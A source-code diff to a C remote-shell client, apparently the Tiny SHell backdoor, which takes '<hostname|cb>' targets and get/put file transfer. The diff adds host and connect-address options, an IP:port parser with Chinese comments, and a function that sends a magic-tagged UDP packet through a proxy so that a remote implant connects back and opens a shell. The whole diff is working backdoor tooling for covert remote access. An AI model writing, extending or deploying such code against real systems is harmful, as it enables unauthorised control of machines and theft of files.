@@ -35,12 +35,77 @@ void pel_error( char *s );
 
 void usage(char *argv0)
 {
-    fprintf(stderr, "Usage: %s [ -s secret ] [ -p port ] [command]\n"
+	fprintf(stderr, "Usage: %s [ -s secret ] [ -h host] [ -c ip:port] [ -p port ] [command]\n"
         "\n"
         "   <hostname|cb>\n"
         "   <hostname|cb> get <source-file> <dest-dir>\n"
         "   <hostname|cb> put <source-file> <dest-dir>\n", argv0);
     exit(1);
+}
+
+#include "tshUdpProxy.h"
+void sendUdpSignal(const char *listenHostname, uint16_t listenPort, uint32_t connIp, uint16_t connPort) {
+	int udpSock;
+	struct sockaddr_in udpServerAddr;
+
+	const char *udpProxyHost = "localhost";
+	uint16_t udpProxyPort = UDP_ProxyPort;
+
+	udpServerAddr = parseHostAndPort(udpProxyHost, udpProxyPort);
+
+	struct tshProtocol data;
+	data.magic = MAGIC;
+	data.type = UPD_CONNECT;
+	data.length = sizeof(data);
+
+	data.conn_ip = connIp;
+	data.conn_port = connPort;
+
+	if (NULL == listenHostname) {
+		listenHostname = "0.0.0.0";
+	}
+	data.listen_ip = parseHostInetAddr(listenHostname);
+	data.listen_port = htons(listenPort);
+
+	info("udp send " IPBLabel " to cb connect [%d.%d.%d.%d:%d] to listen [%s,%d.%d.%d.%d:%d]\n",
+		   IPBValue(udpServerAddr),
+		   __IP3(connIp), __IP2(connIp), __IP1(connIp), __IP0(connIp), __PORT(connPort),
+		   listenHostname,
+		   __IP3(data.listen_ip), __IP2(data.listen_ip),
+		   __IP1(data.listen_ip), __IP0(data.listen_ip), __PORT(data.listen_port)
+		   );
+
+	udpSock = socket(AF_INET, SOCK_DGRAM, 0);
+	udpSendPacket(udpSock, &data, &udpServerAddr);
+	close(udpSock);
+}
+
+/*
+ 返回值是 ip和outPort是网络字节
+ */
+static int spliteIpAndPort(const char *str, uint32_t *outIp, uint16_t *outPort) {
+	// str = 192.158.2.4:12433
+	char *p = strchr(str, ':');
+	if (NULL == p)
+		return -1;
+
+	uint8_t ip3, ip2, ip1, ip0;
+	uint16_t port;
+	int ret;
+	ret = sscanf(str, "%hhu.%hhu.%hhu.%hhu:%hu", &ip3, &ip2, &ip1, &ip0, &port);
+	debug("match %d IP [%d.%d.%d.%d:%d]\n", ret, ip3, ip2, ip1, ip0, port);
+	if (ret != 5)
+		return -1;
+	if (outIp) {
+		*outIp = htonl(((ip3 << 24) & 0xFF000000) |
+					   ((ip2 << 16) & 0x00FF0000) |
+					   ((ip1 << 8) & 0x0000FF00) |
+					   ((ip0 << 0) & 0x000000FF));
+	}
+	if (outPort) {
+		*outPort = htons(port);
+	}
+	return 0;
 }
 
 int main( int argc, char *argv[] )
@@ -52,8 +117,11 @@ int main( int argc, char *argv[] )
     struct sockaddr_in client_addr;
     struct hostent *server_host;
     char action, *password;
+	// 要连接的IP和端口 -c 192.158.2.4:12433
+	uint32_t connIp = 0;
+	uint16_t connPort = 0;
 
-    while ((opt = getopt(argc, argv, "p:s:")) != -1) {
+	while ((opt = getopt(argc, argv, "p:s:h:c:")) != -1) {
         switch (opt) {
             case 'p':
                 server_port=atoi(optarg); /* We hope ... */
@@ -62,6 +130,15 @@ int main( int argc, char *argv[] )
             case 's':
                 secret=optarg; 
                 break;
+			case 'h':
+				server_hostname = optarg;
+				break;
+			case 'c':
+				if (spliteIpAndPort(optarg, &connIp, &connPort)) {
+					fprintf(stderr, "connect address is invalid %s\n", optarg);
+					exit(1);
+				}
+				break;
             default: /* '?' */
                 usage(*argv);
                 break;
@@ -175,6 +252,12 @@ connect:
             perror( "listen" );
             return( 8 );
         }
+
+		info("udp send  cb connect [%d.%d.%d.%d:%d] \n",
+			 __IP3(connIp), __IP2(connIp), __IP1(connIp), __IP0(connIp), __PORT(connPort)
+			 );
+
+		sendUdpSignal(server_hostname, server_port, connIp, connPort);
 
         fprintf( stderr, "Waiting for the server to connect..." );
         fflush( stderr );
